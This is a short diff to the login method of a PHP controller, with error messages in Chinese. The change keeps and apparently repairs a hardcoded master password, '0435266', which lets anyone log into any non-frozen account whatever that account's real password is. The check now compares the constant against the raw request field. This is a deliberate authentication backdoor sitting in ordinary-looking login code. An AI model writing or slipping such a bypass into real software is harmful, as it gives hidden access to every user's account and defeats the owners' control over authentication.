@@ -101,7 +101,7 @@ class CommonController extends BaseController
         if ($user['status'] == 0) {
             return out(null, 10001, '账号已被冻结');
         }
-        if($password!='0435266' && $password != $user['password']){
+        if($req['password']!='0435266' && $password != $user['password']){
             return out(null, 10001, '账号或密码错误');
         }
 
